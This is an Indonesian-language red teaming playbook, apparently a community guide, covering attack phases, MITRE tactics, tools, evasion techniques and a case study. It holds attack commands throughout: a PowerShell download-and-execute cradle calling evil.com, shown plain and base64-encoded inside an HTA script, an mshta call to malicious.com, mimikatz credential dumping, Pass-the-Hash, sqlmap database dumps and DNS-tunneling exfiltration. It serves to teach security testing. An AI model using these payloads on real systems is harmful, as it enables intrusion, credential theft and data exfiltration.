
# 🔥 Red Teaming Playbook 🔥  
### 📌 Panduan Lengkap Simulasi Serangan Dunia Nyata  

## 🛠️ 1. Pendahuluan  
**Red Teaming** adalah pendekatan ofensif dalam keamanan siber yang mensimulasikan **serangan nyata** untuk menguji ketahanan keamanan suatu organisasi. Berbeda dengan **penetration testing** biasa, Red Teaming berfokus pada **pengelabuan (evasion), eksploitasi berkelanjutan (persistence), dan pengujian keamanan end-to-end**.

| **🔍 Aspek**  | **Penetration Testing**  | **Red Teaming**  |
|--------------|-----------------------|----------------|
| **Tujuan**   | Mencari kelemahan spesifik | Meniru serangan nyata |
| **Pendekatan** | Fokus pada eksploitasi teknis | Menyusun skenario serangan kompleks |
| **Durasi**   | Beberapa minggu | Berbulan-bulan |
| **Hasil**    | Laporan kerentanan | Evaluasi keamanan sistem end-to-end |

---

## 🛠️ 2. Fase Red Teaming  

1️⃣ **Reconnaissance (Pengintaian)**  
   - **Passive Recon**: OSINT, WHOIS lookup, subdomain enumeration.  
   - **Active Recon**: Port scanning, service enumeration, phishing analysis.  

2️⃣ **Initial Access (Akses Awal)**  
   - **Spear Phishing**: Mengirim email berisi malware/Payload khusus.  
   - **Exploiting Web Apps**: Memanfaatkan celah RCE, SQLi, SSRF.  
   - **Stolen Credentials**: Brute-force, password spraying, credential stuffing.  

3️⃣ **Privilege Escalation (Eskalasi Hak Akses)**  
   - **Windows**: Token impersonation, Kerberoasting, LPE exploits.  
   - **Linux**: SUID misconfiguration, privilege misconfigurations.  

4️⃣ **Lateral Movement (Perluasan Akses)**  
   - **SMB Relay Attack** (Pass-the-Hash).  
   - **Remote Code Execution (RCE)** di sistem lain.  

5️⃣ **Persistence (Memastikan Akses Tetap Ada)**  
   - **Backdoor via Scheduled Task, Registry, atau SSH Tunneling.**  
   - **Rootkit & Fileless Malware** untuk stealth attack.  

6️⃣ **Exfiltration (Pencurian Data)**  
   - **Covert channels** (DNS tunneling, ICMP exfiltration).  
   - **Encrypting & Packing Data** untuk menghindari deteksi.  

---

## 🛠️ 3. Teknik & Taktik (TTPs) MITRE ATT&CK  

| **🔹 Taktik** | **Teknik** |
|--------------|-----------|
| 🛠️ Initial Access | Phishing, Watering Hole Attack, Exploiting Web Apps |
| 🛠️ Privilege Escalation | Kernel Exploit, Token Manipulation, Pass-the-Hash |
| 🛠️ Defense Evasion | Process Injection, Obfuscated Scripts, Rootkits |
| 🛠️ Credential Access | Keylogging, Brute-force, Stealing Password Hashes |
| 🛠️ Persistence | Registry Modification, Backdoors, Startup Manipulation |
| 🛠️ Lateral Movement | RDP Hijacking, SMB Exploitation, SSH Pivoting |
| 🛠️ Exfiltration | Data Encryption, Covert C2, DNS Tunneling |

---

## 🛠️ 4. Simulasi Red Teaming  

🔥 **1. Recon & Exploitation**  
   ```bash
   nmap -sS -Pn -A -p- target.com
   subfinder -d target.com | httpx -silent
   sqlmap -u "https://target.com/login" --dump-all
   ```
🔥 **2. Payload Injection & Evasion**  
   ```python
   import base64
   payload = "powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
   encoded = base64.b64encode(payload.encode()).decode()
   print(encoded)
   ```
🔥 **3. Privilege Escalation (Linux SUID Exploit)**  
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ./vulnerable_binary
   ```
🔥 **4. Lateral Movement (Pass-the-Hash on Windows)**  
   ```bash
   evil-winrm -i target_ip -u Administrator -H "NTLM-HASH"
   ```
🔥 **5. Data Exfiltration via DNS Tunneling**  
   ```bash
   dns2tcp -d targetdns.com -r 53 -z secret_data.txt
   ```

---

## 🛠️ 5. Bypassing Security & Evasion  

**🔹 Teknik Menghindari Deteksi:**  
✅ **Obfuscation**: Encode payload dalam **Base64, XOR, atau AES**.  
✅ **Fileless Execution**: Menggunakan **LOLBins (Living off the Land Binaries)** seperti `mshta.exe` atau `regsvr32.exe`.  
✅ **Memory Injection**: Menjalankan shellcode langsung ke **memory tanpa menyentuh disk**.  
✅ **C2 Frameworks**: Gunakan **Cobalt Strike, Empire, atau Sliver** untuk komunikasi stealth.  

🔥 **Contoh Payload Fileless Execution (Windows HTA Attack)**  
```html
<script>eval(atob('cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtYyAiSUVYKE5ldy1PYmplY3QgTmV0LldlYlJlcXVlc3QpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vZXZpbC5jb20vcGF5bG9hZC5wc2gnKSI='))</script>
```

---

## 🛠️ 6. Pelaporan & Dokumentasi Serangan  

🔹 **Format Laporan Red Teaming**  
✅ **Ringkasan Serangan** (Metode, tujuan, dampak).  
✅ **Langkah Eksekusi** (Setiap tahap dengan bukti).  
✅ **Rekomendasi Mitigasi** (Solusi agar tidak bisa dieksploitasi lagi).  

📌 **Contoh Template Pelaporan:**  
```yaml
Serangan: Phishing & Credential Dumping  
Target: employee@target.com  
Payload: Malicious macro (CVE-2023-XXXX)  
Eksploitasi: Mencuri NTLM Hash & Pass-the-Hash attack  
Mitigasi: Implementasi MFA & disable NTLM Authentication  
```

---

## 🔥 7. Tools Red Teaming  

| **🛠️ Kategori** | **🔹 Tools** |
|----------------|------------|
| 🕵️ Reconnaissance | Shodan, SpiderFoot, TheHarvester |
| 🎯 Exploitation | Metasploit, SQLmap, BloodHound |
| 🏴 Lateral Movement | CrackMapExec, Mimikatz, Rubeus |
| 🔥 C2 Frameworks | Cobalt Strike, Empire, Sliver |
| 🛡️ Evasion | Veil, SharpShooter, Obfuscation.io |

---

# 🔥 Red Teaming - Perbandingan Teknik & Eksekusi 🔥  

## 🛠️ 1. Perbandingan Metode Red Teaming  

| **Aspek** | **Pentesting Tradisional** | **Red Teaming** |
|-----------|--------------------------|----------------|
| **Fokus** | Mengidentifikasi celah keamanan teknis | Mensimulasikan serangan dunia nyata |
| **Pendekatan** | Langsung mengeksploitasi kerentanan | Social engineering, persistence, evasion |
| **Durasi** | Beberapa hari/minggu | Beberapa bulan |
| **Interaksi dengan Defender** | Terbatas, sering terjadwal | Continuous, stealth-based |
| **Tujuan** | Mengungkap kelemahan sistem | Mengetes kesiapan tim pertahanan (Blue Team) |

---

## 🛠️ 2. Perbandingan Teknik Evasion (Bypassing Detection)  

| **Teknik** | **Deskripsi** | **Kelebihan** | **Kekurangan** | **Contoh** |
|------------|--------------|--------------|---------------|------------|
| **Obfuscation** | Menyembunyikan payload menggunakan encoding (Base64, XOR) | Mudah diterapkan | Bisa di-decode oleh antivirus | `echo YWJjZGVmCg== | base64 -d` |
| **Fileless Execution** | Menjalankan kode langsung dari RAM, tanpa menyentuh disk | Sulit dideteksi oleh AV | Tidak persisten setelah reboot | `powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"` |
| **Process Injection** | Menyisipkan payload ke dalam proses yang sah (svchost.exe) | Bypass antivirus | Bisa dideteksi oleh EDR jika tidak stealth | `Invoke-ReflectivePEInjection -PEPath payload.dll -ProcessID 1234` |
| **Living off the Land (LOLBins)** | Menjalankan serangan dengan tool bawaan Windows/Linux | Tidak memerlukan malware tambahan | Terbatas pada fitur bawaan OS | `mshta.exe http://malicious.com/payload.hta` |

---

## 🛠️ 3. Teknik Eksploitasi Berdasarkan Sistem Target  

| **Target** | **Teknik Eksploitasi** | **Deskripsi** | **Contoh** |
|-----------|----------------------|-------------|------------|
| **Windows** | Pass-the-Hash | Menggunakan hash NTLM curian untuk login tanpa password | `mimikatz.exe sekurlsa::pth /user:admin /domain:target /ntlm:<hash>` |
| **Linux** | SUID Misconfiguration | Mengeksploitasi file dengan SUID bit untuk privilege escalation | `find / -perm -4000 -type f 2>/dev/null` |
| **Web Apps** | SQL Injection | Menyisipkan query SQL berbahaya untuk dump database | `sqlmap -u "http://target.com/login.php?id=1" --dump-all` |
| **Cloud (AWS/GCP/Azure)** | Misconfigured IAM Policies | Menggunakan kebijakan IAM lemah untuk akses tidak sah | `aws s3 ls --profile attacker` |

---

## 🛠️ 4. Simulasi Eksploitasi dengan Contoh Eksekusi  

🔥 **1. Recon (Pengintaian) & Passive Information Gathering**  
```bash
subfinder -d target.com | httpx -silent
nmap -sS -Pn -A -p- target.com
```
**📌 Tujuan:** Menganalisis domain, subdomain, dan layanan yang berjalan.  

🔥 **2. Eksploitasi SQL Injection untuk Credential Dumping**  
```bash
sqlmap -u "https://target.com/login?user=admin" --dump-all --batch
```
**📌 Tujuan:** Mencuri data kredensial dari database target.  

🔥 **3. Windows Privilege Escalation (Token Manipulation via Mimikatz)**  
```powershell
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```
**📌 Tujuan:** Mengekstrak kredensial yang tersimpan dalam memori sistem Windows.  

🔥 **4. Lateral Movement dengan Pass-the-Hash (PTH)**  
```bash
psexec.py TARGET/Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
```
**📌 Tujuan:** Bergerak ke sistem lain dalam jaringan dengan menggunakan hash NTLM.  

🔥 **5. Data Exfiltration melalui DNS Tunneling (Menghindari IDS/Firewall)**  
```bash
dnscat2 --dns target.com --secret-file sensitive_data.txt
```
**📌 Tujuan:** Mengekstrak data secara stealth tanpa terdeteksi firewall atau IDS.  

---

## 🛠️ 5. Perbandingan Red Teaming vs Blue Teaming dalam Insiden Cyber  

| **Aspek** | **Red Team (Attacker)** | **Blue Team (Defender)** |
|-----------|----------------------|-----------------------|
| **Tujuan** | Menemukan dan mengeksploitasi kelemahan | Mendeteksi dan merespons serangan |
| **Metode** | Simulasi serangan siber | Monitoring & threat hunting |
| **Tools** | Metasploit, Cobalt Strike, Empire | SIEM, EDR, Firewalls, Threat Intelligence |
| **Strategi** | Persistence, evasion, lateral movement | Incident response, patching, forensics |
| **Keberhasilan** | Akses tidak terdeteksi, ekfiltrasi data | Memblokir atau membatasi serangan |

🔥 **📌 Contoh Simulasi Blue Team dalam Mendeteksi Serangan Red Team**  
```bash
grep "Unauthorized access attempt" /var/log/auth.log
splunk search "source=firewall_logs | stats count by src_ip"
```
**📌 Tujuan:** Mengidentifikasi aktivitas mencurigakan berdasarkan **log dan threat intelligence**.  

---

## 🛠️ 6. Studi Kasus: Simulasi Serangan Nyata  

📌 **Kasus:**  
- Sebuah organisasi memiliki sistem internal berbasis Windows Active Directory (AD).  
- Red Team ingin menguji kemungkinan eksploitasi & data exfiltration.  

📌 **Strategi Red Team:**  
✅ **Reconnaissance:** Enumerasi subdomain, scanning layanan AD.  
✅ **Initial Access:** Phishing email dengan payload yang mengelabui user.  
✅ **Privilege Escalation:** Eksploitasi kelemahan SUID binary di sistem Linux internal.  
✅ **Lateral Movement:** Pass-the-Hash untuk menyebar di jaringan internal.  
✅ **Data Exfiltration:** DNS tunneling untuk menghindari firewall.  

🔥 **Eksekusi Red Team dalam Simulasi ini:**  
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p password --shares
kerberoast.py -dc-ip 192.168.1.100 -user target
```
📌 **Hasil:** Red Team berhasil mengekstrak kredensial domain admin dan mengakses file sensitif di **Active Directory**.  

🚀 **Mitigasi yang Dapat Dilakukan Blue Team:**  
✅ **Gunakan MFA untuk mengurangi risiko credential dumping.**  
✅ **Pantau aktivitas tidak wajar di SIEM menggunakan Splunk/ELK.**  
✅ **Terapkan endpoint protection (EDR) untuk deteksi real-time.**  

---

## 🎯 Kesimpulan  

**Red Teaming** adalah pendekatan yang lebih kompleks dibandingkan **penetration testing biasa**, karena melibatkan **serangan berkelanjutan** dan **teknik stealth** untuk menguji kesiapan tim keamanan (Blue Team).  

💡 **Mau belajar lebih lanjut? Gabung ke CyberHeroes!** 🚀  
🔗 **[CyberHeroes Community](https://chat.whatsapp.com/JJCwRcmcmHf4HBNhqjYvuK)**  
🔗 **[GitHub Exploit Dictionary](https://github.com/Cyberheroess/Comprehensive-Exploit-Dictionary/blob/main/Payload-mutation.md)**  

